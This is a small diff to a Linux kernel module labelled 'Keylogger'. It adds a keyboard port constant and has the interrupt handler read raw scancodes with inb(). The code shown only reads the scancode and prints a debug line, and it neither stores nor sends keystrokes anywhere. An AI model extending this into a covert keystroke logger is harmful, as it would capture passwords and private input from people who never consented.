@@ -16,6 +16,9 @@ MODULE_DESCRIPTION("Keylogger");
 MODULE_LICENSE("GPL");
 
 
+#define KB_PORT 0x60
+
+
 typedef struct keylogger_data
 {
 	char *log_buffer;
@@ -66,8 +69,11 @@ static struct miscdevice misc_dev = {
 
 static irqreturn_t keylogger_handle(int irq_n, void *data)
 {
-	t_keylogger_data *logs = (t_keylogger_data *)data;
+	t_keylogger_data 	*logs = (t_keylogger_data *)data;
+	char 				scancode;
 	(void)logs;
+
+	scancode = inb(KB_PORT);
 	printk(KERN_INFO "HANDLER GOT CALLED\n");
 	return IRQ_HANDLED;
 }
